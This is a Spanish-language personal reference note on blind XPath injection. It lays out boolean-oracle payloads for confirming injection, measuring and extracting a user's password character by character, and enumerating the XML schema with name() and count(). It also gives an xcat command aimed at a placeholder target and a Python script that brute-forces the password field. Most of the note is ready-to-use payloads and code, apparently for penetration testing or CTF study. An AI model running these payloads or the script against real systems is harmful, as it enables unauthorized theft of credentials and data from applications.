---
tipo: meta
aliases:
  - XPath blind extraction
  - substring XPath
  - xcat
tags:
  - meta/referencia
  - dominio/web
---

# XPath extracción ciega - matriz de referencia

> [!info] Referencia pura, no un zettel
> Cómo sacar el documento carácter por carácter cuando no se refleja. La sintaxis y los payloads de bypass están en [[XPath consulta - matriz de referencia]]; el criterio, en [[XPath - extracción ciega]].

Estructura paralela a [[SQLi ciego - matriz de referencia]], [[NoSQL extracción ciega - matriz de referencia]] y [[LDAP extracción ciega - matriz de referencia]]. XPath es la que más se parece a SQLi, porque tiene `substring()` y `string-length()` como SQL.

## 1. El oráculo

| Canal | Verdadero | Falso |
|---|---|---|
| Booleano por respuesta | login sí / resultado presente / `200` | no / vacío / `403` |

XPath 1.0 **no tiene canal temporal**. Sin oráculo booleano, la extracción se corta. XPath 2.0 a veces permite otros canales — ver [[XPath consulta - matriz de referencia]] § 7.

## 2. Confirmar el oráculo

```
' or string-length(//usuario[1]/clave)>0 or '   → verdadero si hay clave
' or string-length(//usuario[1]/clave)>999 or ' → casi siempre falso
```

## 3. Medir el largo

```
' or string-length(//usuario[1]/clave)=8 or '
```

Iterar el número, o bisecar con `>`:
```
' or string-length(//usuario[1]/clave)>8 or '
```

## 4. Extraer carácter por carácter

```
' or substring(//usuario[1]/clave,1,1)='a' or '   → ¿primer carácter 'a'?
' or substring(//usuario[1]/clave,1,1)='b' or '
...fijado el primero:
' or substring(//usuario[1]/clave,2,1)='a' or '   → segundo
```

Bisecar con comparación, más rápido que 26+ letras:
```
' or substring(//usuario[1]/clave,1,1)>'m' or '   → ¿mayor que 'm'?
```

Convertir a código para bisección numérica limpia:
```
' or string-to-codepoints(substring(...,1,1))[1]>109 or '   (XPath 2.0)
```

## 5. Enumerar la estructura — la ventaja de XPath

Sin control de acceso por nodo, se reconstruye el esquema entero:

```
' or count(/*)=1 or '                  → ¿cuántos nodos raíz?
' or name(/*[1])='usuarios' or '       → nombre de la raíz
' or count(//usuario)=5 or '           → cuántos usuarios
' or count(//usuario[1]/*)=3 or '      → cuántos campos tiene un usuario
' or name(//usuario[1]/*[1])='nombre' or ' → nombre del primer campo
```

Con `name()` y `count()` se descubre el documento sin conocerlo, y recién después se extrae cada valor. Es más completo que en las hermanas, porque el XML expone su estructura.

## 6. Extraer todo el documento

Recorrer nodo por nodo con `position()`:
```
' or substring(//usuario[1]/nombre,1,1)='a' or '
' or substring(//usuario[2]/nombre,1,1)='a' or '   → siguiente usuario
```

O apuntar a todo el texto:
```
//usuario[position()=N]/*[position()=M]
```

## 7. Automatizar

`xcat` — herramienta específica de extracción ciega de XPath, hace todo esto solo:

```sh
xcat run --method GET 'http://objetivo/login' username password \
  'http://objetivo/login?username=admin&password=x' --true-string "Welcome"
```

Script propio, el esqueleto:

```python
import requests, string
extraido = ""
pos = 1
while True:
    for c in string.printable:
        p = f"' or substring(//usuario[1]/clave,{pos},1)='{c}' or '"
        r = requests.post(URL, data={"user": p, "pass": "x"})
        if es_verdadero(r):
            extraido += c
            pos += 1
            break
    else:
        break
print(extraido)
```

## 8. Tabla de errores

| Lo que ves | Qué pasa |
|---|---|
| `substring` no cambia nada | La entrada se escapa. Ver [[XPath consulta - matriz de referencia]] § 1 |
| Todos los caracteres dan verdadero | Oráculo invertido o ruta del nodo mal. Confirmar con § 2 |
| No hay estado observable | XPath 1.0 sin canal temporal. Sin oráculo, no hay extracción |
| Lentísimo | Sin canal temporal es inevitable; bisecar con `>`, § 4 |
| La comilla del payload rompe | Balancear como en la matriz de consulta, § 3 de aquella |
| `string-to-codepoints` no existe | Es 1.0; bisecar con `>` sobre el carácter directo |

## Relacionadas

[[MOC - XPath injection]] · [[XPath consulta - matriz de referencia]] · [[XPath - extracción ciega]] · [[SQLi ciego - matriz de referencia]]
